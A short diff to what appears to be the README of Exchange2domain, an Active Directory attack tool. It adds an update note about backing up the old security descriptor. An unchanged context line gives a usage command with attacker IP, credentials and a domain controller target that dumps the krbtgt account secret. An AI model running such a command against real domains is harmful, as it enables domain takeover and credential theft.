@@ -75,3 +75,9 @@ example:
 ```
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip  --just-dc-user krbtgt MailServerip
 ```
+
+## Update
+
+Auto backup old SD for restore.
+
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190621191722.png)
